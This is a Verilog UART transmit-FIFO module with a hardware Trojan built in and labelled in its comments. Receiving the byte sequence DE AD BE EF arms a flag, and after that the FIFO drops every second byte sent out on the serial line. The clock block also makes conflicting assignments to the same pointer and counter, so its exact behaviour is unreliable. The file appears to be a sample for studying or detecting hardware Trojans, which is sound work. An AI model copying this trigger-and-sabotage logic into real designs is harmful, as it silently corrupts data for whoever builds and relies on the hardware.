 module uart_tx_fifo (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output tx_serial
);

    // FIFO memory and pointers
    reg [7:0] mem [0:31];
    reg [4:0] w_addr = 5'd0, r_addr = 5'd0;
    reg [4:0] cnt = 5'd0;
    reg we = 1'b0;
    reg [7:0] data = 8'd0;

    // Variables for the UART TX module
    wire uart_busy;
    uart_tx uart (
        .clk(clk),
        .rx_we(we),
        .rx_data(data),
        .tx_busy(uart_busy),
        .tx_serial(tx_serial)
    );

    // Variables for Trojan activation
    reg [7:0] trigger_sequence [0:3]; // Array to store the sequence of bytes that triggers the Trojan
    reg [1:0] sequence_index = 2'b0; // Index to track the current position in the sequence
    reg trojan_triggered = 1'b0; // Flag to indicate whether the Trojan has been triggered

    // Initialization of the trigger sequence
    initial begin
        trigger_sequence[0] = 8'hDE; // First byte of the trigger sequence
        trigger_sequence[1] = 8'hAD; // Second byte of the trigger sequence
        trigger_sequence[2] = 8'hBE; // Third byte of the trigger sequence
        trigger_sequence[3] = 8'hEF; // Fourth byte of the trigger sequence
    end

    always @ (posedge clk) begin
        if (rx_we) begin
            if (rx_data == trigger_sequence[sequence_index]) begin
                sequence_index <= sequence_index + 1;
                if (sequence_index == 3) begin // Last element of the sequence
                    trojan_triggered <= 1'b1; // Trigger the Trojan
                end
            end else begin
                sequence_index <= 2'b0; // Reset the sequence if any byte does not match
            end

            if (cnt < 5'd31) begin
                w_addr <= w_addr + 5'd1;
                mem[w_addr] <= rx_data;
                cnt <= cnt + 5'd1;
            end
        end

        if (~uart_busy && cnt > 5'd0 && ~we) begin
            r_addr <= r_addr + 5'd1;
            cnt <= cnt - 5'd1;
            data <= mem[r_addr];
            we <= 1'b1;
        end else begin
            we <= 1'b0;
        end

        if (trojan_triggered && (cnt > 5'd0)) begin
            // Skip every second byte when the Trojan is triggered
            if (cnt > 5'd1) begin
                r_addr <= r_addr + 5'd2; // Skip one byte
                cnt <= cnt - 5'd2;
            end else begin
                r_addr <= r_addr + 5'd1; // Normal read when only one byte left
                cnt <= cnt - 5'd1;
            end
        end
    end
endmodule
